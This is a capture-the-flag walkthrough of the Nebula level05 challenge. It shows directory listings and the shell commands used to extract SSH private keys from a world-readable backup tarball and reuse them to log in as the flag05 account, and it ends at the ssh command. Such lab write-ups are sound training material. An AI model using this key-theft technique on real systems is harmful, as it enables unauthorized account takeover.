**Intro**

The Nebula author just says to look for weak directory permissions.  What I find is

```
﻿level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
```

`.backup` sounds interesting AND provides world read/execute permissions, which allow me to browse into that folder in look around.

In .backup the following files are presented

```
﻿level05@nebula:/home/flag05/.backup$ ls -la
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
```

Someone left a world-readable backup file.  Let's examine the contents

```
﻿level05@nebula:/home/flag05/.backup$ tar zxvf backup-19072011.tgz -C /tmp
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
```

Could those be the [ssh keys](https://wiki.archlinux.org/index.php/SSH_keys) for the `flag05` account?  Only one way to find out!
 
Copy the files to the level05 user

```
﻿level05@nebula:/home/flag05/.backup$ cp -rv  /tmp/.ssh/ ~/
`/tmp/.ssh/authorized_keys' -> `/home/level05/.ssh/authorized_keys'
`/tmp/.ssh/id_rsa' -> `/home/level05/.ssh/id_rsa'
`/tmp/.ssh/id_rsa.pub' -> `/home/level05/.ssh/id_rsa.pub'
```

ssh to localhost as `flag05`

```
level05@nebula:/home/flag05/.backup$ ssh flag05@localhost
